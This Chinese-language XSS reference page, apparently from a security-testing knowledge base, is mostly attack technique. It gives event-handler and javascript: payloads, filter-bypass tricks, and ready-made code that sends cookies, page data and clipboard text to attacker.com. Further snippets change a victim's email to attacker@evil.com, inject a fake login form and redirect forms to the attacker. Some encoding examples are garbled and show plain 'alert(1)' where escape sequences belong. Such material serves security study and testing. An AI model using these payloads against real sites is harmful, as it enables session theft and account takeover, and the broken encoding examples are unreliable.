# JavaScript for XSS

> **参考：** [XSS 主文档](../Cross-site%20scripting%20(XSS).md) | [XSS Payloads](../XSS%20Payloads/XSS%20Payloads.md) | [DOM and Browser](../DOM%20and%20Browser/DOM%20and%20Browser.md) | [JavaScript 阅读基础](JavaScript%20阅读基础.md)

---

## JavaScript 在浏览器中的执行模型

### 事件循环与异步执行

JavaScript 在浏览器中采用单线程事件循环模型。理解此模型对 XSS 攻击的隐蔽性和可靠性至关重要。

| 特性 | 说明 | XSS 利用意义 |
|------|------|-------------|
| **单线程** | JS 一次只能执行一段代码 | `alert()` 等阻塞函数会让页面卡住，暴露攻击 |
| **事件循环** | 异步任务（setTimeout、fetch）排队执行 | 可使用异步方式低调执行 payload |
| **宏任务/微任务** | Promise.then 比 setTimeout 更早执行 | 控制 payload 执行时序 |

**阻塞 vs 非阻塞：**

```javascript
// 阻塞式 -- 用户会看到弹窗，明显暴露
alert(1);

// 非阻塞式 -- 静默外泄数据，不易察觉
fetch('https://attacker.com/steal?data=' + document.cookie);
```

### 全局对象与作用域

浏览器中，`window` 是全局对象。所有全局变量和函数实际上是 `window` 的属性。

```javascript
// 以下两种写法等价
alert(1);
window.alert(1);

// 在 XSS payload 中通常省略 window 前缀以缩短 payload
```

**作用域链：** 在事件处理器内部，`this` 指向触发事件的元素。理解这一点对某些绕过技术很重要。

---

## 事件处理器（Event Handlers）

事件处理器是 XSS payload 最常用的 JavaScript 执行入口。不同事件处理器有不同的触发条件和限制。

### 常用事件处理器分类

#### 无需用户交互即可触发的事件

| 事件 | 触发条件 | Payload 示例 | 限制 |
|------|---------|-------------|------|
| `onerror` | 资源加载失败时 | `<img src=x onerror=alert(1)>` | 需要无效的 src |
| `onload` | 元素加载完成时 | `<body onload=alert(1)>` | 某些元素上 `onload` 不触发 |
| `onfocus` | 元素获得焦点时 | `<input autofocus onfocus=alert(1)>` | 需配合 autofocus |
| `onanimationstart` | CSS 动画开始时 | `<style>@keyframes x{}</style><div style="animation:x" onanimationstart=alert(1)>` | 需定义动画 |
| `ontransitionend` | CSS 过渡完成时 | `<style>div{transition:all 1s}</style><div style="opacity:0" ontransitionend=alert(1)>` | 局限性较大 |
| `ontoggle` | `<details>` 元素切换时 | `<details open ontoggle=alert(1)>` | 仅 `<details>` 标签 |

#### 需要用户交互的事件

| 事件 | 触发条件 | Payload 示例 |
|------|---------|-------------|
| `onclick` | 用户点击时 | `<div onclick=alert(1)>click</div>` |
| `onmouseover` | 鼠标悬停时 | `<div onmouseover=alert(1)>hover</div>` |
| `onmouseenter` | 鼠标进入时 | `<div onmouseenter=alert(1)>enter</div>` |
| `onscroll` | 元素滚动时 | `<div onscroll=alert(1)>content</div>` |
| `oninput` | 输入值改变时 | `<input oninput=alert(1)>` |
| `onkeydown` | 按键按下时 | `<input onkeydown=alert(1)>` |
| `oncopy` | 复制内容时 | `<body oncopy=alert(1)>` |
| `onpaste` | 粘贴内容时 | `<input onpaste=alert(1)>` |

### 事件处理器精简化技巧

在 payload 长度受限时，精简事件处理器语法：

```javascript
// 常规写法
<img src=x onerror="alert(1)">

// 精简：省略引号（无空格时）
<img src=x onerror=alert(1)>

// 精简：使用反引号（含空格时）
<img src=x onerror=alert`1`>

// 使用 throw 传递参数
<img src=x onerror="onerror=alert;throw 1">
```

---

## 字符串与编码

### JavaScript 字符串转义规则

在 XSS payload 中，理解 JavaScript 如何在字符串中解析转义序列对绕过过滤器至关重要。

| 转义序列 | 字符 | 说明 |
|----------|------|------|
| `\'` | 单引号 | 在单引号字符串中使用 |
| `\"` | 双引号 | 在双引号字符串中使用 |
| `\\` | 反斜杠 | 转义反斜杠本身 |
| `\n` | 换行 | 换行符 |
| `\r` | 回车 | 回车符 |
| `\t` | 制表符 | Tab |
| `\xHH` | Latin-1 字符 | 十六进制（2位），如 `\x3c` = `<` |
| `\uHHHH` | Unicode 字符 | 十六进制（4位），如 `<` = `<` |
| `\u{HHH}` | Unicode 码点 | ES6 码点转义，如 `\u{3c}` = `<` |
| &#96; | 反引号 | 模板字面量分隔符 |

**编码绕过示例：**

```javascript
// 原始 payload
alert(1)

// \x 十六进制编码
\x61\x6c\x65\x72\x74\x28\x31\x29

// \u Unicode 编码
alert(1)

// 组合使用
alert(1)
```

### HTML 实体编码与 JS 解码顺序

浏览器解析包含 JavaScript 的 HTML 时遵循特定的解码顺序。理解此顺序是利用 HTML 编码绕过过滤器的关键。

**解码顺序：**

1. HTML 解析器解析 HTML 标签和属性
2. 对属性值进行 HTML 实体解码
3. 将解码后的值传递给 JavaScript 引擎
4. JavaScript 引擎解析和执行代码

**关键应用：** 当 XSS 注入点在事件处理器（如 `onclick`）中时，首先发生 HTML 解码，然后才进行 JavaScript 执行。这意味着可以对 JavaScript 代码进行 HTML 实体编码以绕过服务器端过滤器：

```html
<!-- 服务器过滤单引号，但不过滤 HTML 实体 -->
<a href="#" onclick="var x='&apos;+alert(1)+&apos;';">click</a>

<!-- 浏览器 HTML 解码后变为 -->
<a href="#" onclick="var x=''+alert(1)+'';">click</a>
```

### URL 编码与双重编码

| 函数 | 编码范围 | 不编码的字符 |
|------|----------|------------|
| `encodeURI()` | 编码除 URL 合法字符外的所有字符 | `A-Z a-z 0-9 ; , / ? : @ & = + $ - _ . ! ~ * ' ( ) #` |
| `encodeURIComponent()` | 编码除 URL 标准字符外的所有字符 | `A-Z a-z 0-9 - _ . ! ~ * ' ( )` |

**双重编码绕过：** 某些 WAF 或过滤器仅解码一次，攻击者可以通过双重编码绕过：

```
%253Cscript%253E  →（第一次解码）→ %3Cscript%3E  →（第二次解码）→ <script>
```

---

## JavaScript 伪协议

URL 协议 `javascript:` 可以在多种上下文中执行 JavaScript 代码。

### 触发 javascript: URL 执行的方式

| 上下文 | 示例 | 触发条件 |
|--------|------|---------|
| `<a>` href | `<a href="javascript:alert(1)">click</a>` | 用户点击链接 |
| `<iframe>` src | `<iframe src="javascript:alert(1)">` | iframe 加载时 |
| `location.href` | `location.href = 'javascript:alert(1)'` | 代码执行时 |
| `<form>` action | `<form action="javascript:alert(1)">` | 表单提交时 |
| `<button>` formaction | `<button formaction="javascript:alert(1)">` | 按钮点击时 |

**注意：** 事件处理器（如 `onclick`）中使用 `javascript:` 前缀是冗余的，因为事件处理器本身就是 JavaScript 上下文。但在某些属性注入场景中（如 href 注入），`javascript:` 伪协议是必要的。

---

## XSS 常用的 JavaScript API

### 数据窃取 API

```javascript
// Cookie 窃取 - 最经典的方式
fetch('https://attacker.com/?c=' + encodeURIComponent(document.cookie));

// 使用 Image 对象（绕过 CORS，但不支持 POST）
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);

// navigator.sendBeacon - 最隐蔽（POST 请求，页面卸载时也会发送）
navigator.sendBeacon('https://attacker.com/', document.cookie);

// WebSocket - 全双工通信，持续性连接
var ws = new WebSocket('wss://attacker.com/');
ws.onopen = function() { ws.send(document.cookie); };
```

### 页面内容读取

```javascript
// 读取页面 HTML
document.body.innerHTML
document.documentElement.outerHTML

// 读取特定元素
document.querySelector('input[name="csrf"]').value
document.getElementsByName('csrf')[0].value

// 读取 meta 标签
document.querySelector('meta[name="csrf-token"]').getAttribute('content')

// 读取 localStorage / sessionStorage
localStorage.getItem('access_token')
sessionStorage.getItem('user_data')
```

### 请求与操作 API

```javascript
// 发送 GET 请求
fetch('/admin/users', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/?d=' + encodeURIComponent(d)));

// 发送 POST 请求（绕过 CSRF 保护）
fetch('/account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'email=attacker@evil.com'
});

// 使用 XMLHttpRequest（兼容旧浏览器）
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com');
```

### DOM 操作 API

```javascript
// 创建新元素
var div = document.createElement('div');
div.innerHTML = '<img src=x onerror=alert(1)>';
document.body.appendChild(div);

// 修改页面内容
document.body.innerHTML = '<h1>Hacked!</h1>';

// 插入伪造的登录表单
document.querySelector('.login-form').innerHTML = `
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button>Login</button>
`;

// 修改链接
document.querySelectorAll('a').forEach(a => a.href = 'https://attacker.com/');

// 修改表单 action
document.querySelectorAll('form').forEach(f => f.action = 'https://attacker.com/');
```

---

## 危险 Sink 函数深度解析

### eval() 及相关函数

`eval()` 是最危险的 sink -- 它将字符串作为 JavaScript 代码执行。

```javascript
// 直接 eval 用户输入
eval(location.hash.slice(1));    // ?#alert(1)
eval('var x = "' + userInput + '"');  // "; alert(1); //
```

**eval 的替代形式：**

```javascript
// Function 构造器
new Function('alert(1)')();
new Function('return ' + userInput)();

// setTimeout / setInterval（字符串参数被当作代码执行）
setTimeout('alert(1)', 1000);
setInterval('alert(1)', 5000);

// execScript (仅 IE)
execScript('alert(1)');
```

### innerHTML 与相关 Sinks

`innerHTML` 不会执行 `<script>` 标签，但会触发事件处理器：

```javascript
// 这些不会执行
div.innerHTML = '<script>alert(1)</script>';  // 不执行

// 这些会执行
div.innerHTML = '<img src=x onerror=alert(1)>';  // 执行
div.innerHTML = '<svg onload=alert(1)>';  // 执行
div.innerHTML = '<iframe src="javascript:alert(1)">';  // 在旧浏览器中执行
```

**其他 HTML 注入 Sinks：**

```javascript
// outerHTML -- 行为类似 innerHTML
element.outerHTML = '<img src=x onerror=alert(1)>';

// insertAdjacentHTML -- 指定位置插入 HTML
element.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>');

// document.write / writeln -- 写入原始 HTML 到文档
document.write('<img src=x onerror=alert(1)>');

// Range.createContextualFragment -- 从 HTML 字符串创建文档片段
var fragment = document.createRange().createContextualFragment('<img src=x onerror=alert(1)>');
```

### 安全的 DOM 操作替代方案

| 不安全 | 安全替代 | 说明 |
|--------|---------|------|
| `element.innerHTML = input` | `element.textContent = input` | textContent 将输入作为纯文本处理 |
| `element.innerHTML = input` | `element.innerText = input` | innerText 类似，纯文本 |
| `document.write(input)` | `document.createTextNode(input)` + `appendChild` | 通过 DOM API 安全添加文本 |
| `$(input)` | `$(document.createTextNode(input))` | jQuery 中安全处理文本 |

---

## 常用绕过技巧

### 大小写混淆

HTML 标签和属性名不区分大小写：

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
<SvG OnLoAd=alert(1)>
```

### 空格替代

当空格被过滤时，可以使用替代字符：

| 替代字符 | 编码 | 示例 |
|----------|------|------|
| `/` | `/` | `<img/src=x/onerror=alert(1)>` |
| `%0a` (换行) | URL 编码的换行 | `<img%0asrc=x%0aonerror=alert(1)>` |
| `%0d` (回车) | URL 编码的回车 | `<img%0dsrc=x%0donerror=alert(1)>` |
| `%09` (Tab) | URL 编码的 Tab | `<img%09src=x%09onerror=alert(1)>` |
| `/**/` | JS 多行注释 | `<img/**/src=x/**/onerror=alert(1)>` |

### 引号绕过

当引号被过滤时：

```javascript
// 使用反引号替代引号
<img src=x onerror=alert(`XSS`)>

// 使用 String.fromCharCode 避免引号
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

// 使用正则表达式
<img src=x onerror="eval(/alert(1)/.source)">

// 使用 location 或 document 属性间接获取字符串
<img src=x onerror="eval(location.hash.slice(1))">  // #alert(1)
```

### 括号绕过

当括号被过滤时：

```javascript
// onerror + throw 技术
<img src=x onerror="onerror=alert;throw 1">

// onerror + throw 更复杂的版本
<img src=x onerror="onerror=eval;throw'=alert\x281\x29'">

// 使用 ES6  tagged template
<script>alert`1`</script>

// 使用 bind 绑定参数
<img src=x onerror="setTimeout.bind(null,alert,1)()">
```

### 关键字过滤绕过

```javascript
// eval 被过滤
[].constructor.constructor('alert(1)')()  // 通过 Function 构造器
setTimeout('alert(1)')  // 使用 setTimeout

// alert 被过滤
window['alert'](1)
this['alert'](1)
top['alert'](1)
[].constructor.constructor('alert(1)')()

// document.cookie 被过滤
document['cookie']
document['coo' + 'kie']
```

### JSFuck / 极简编码

利用 JavaScript 的隐式类型转换，仅使用 `[]`、`!`、`+`、`()` 构造任意 JavaScript 代码：

```javascript
// [] 转换为空字符串
[] + []    // ""

// ![] 转换为 false
![] + []   // "false"

// 从 "false" 中提取字符构建任意字符串
(![] + [])[+[]]                    // "f"
(![] + [])[+!+[]]                 // "a"
([![]] + [][[]])[+!+[] + [+[]]]   // "l"
```

完整 JSFuck 编码可以将 `alert(1)` 转换为仅使用 6 个字符的长字符串序列。实际攻击中通常使用在线生成器或脚本生成。

---

## HTML5 API 在 XSS 中的应用

```javascript
// Service Worker -- 持久化攻击
navigator.serviceWorker.register('/sw.js');

// Notification API -- 钓鱼
Notification.requestPermission().then(() => {
    new Notification('Security Alert', { body: 'Please re-login' });
});

// Clipboard API -- 读取剪贴板
navigator.clipboard.readText().then(text => {
    fetch('https://attacker.com/?c=' + text);
});

// History API -- 修改 URL 外观
history.pushState({}, '', '/login');
history.replaceState({}, '', '/dashboard');

// postMessage -- 跨窗口通信
window.postMessage('malicious_data', '*');
```

---

## 模板字面量与表达式注入

ES6 模板字面量使用反引号界定，支持 `${}` 表达式嵌入：

```javascript
// 如果用户输入进入模板字面量
var message = `Hello, ${username}`;

// 恶意 username 值
${alert(1)}
// 结果：alert(1) 被执行

// 更复杂的利用
${Object.constructor.constructor('alert(1)')()}
```

---

> **参考：** [XSS 主文档](../Cross-site%20scripting%20(XSS).md) | [XSS Payloads](../XSS%20Payloads/XSS%20Payloads.md) | [DOM and Browser](../DOM%20and%20Browser/DOM%20and%20Browser.md)
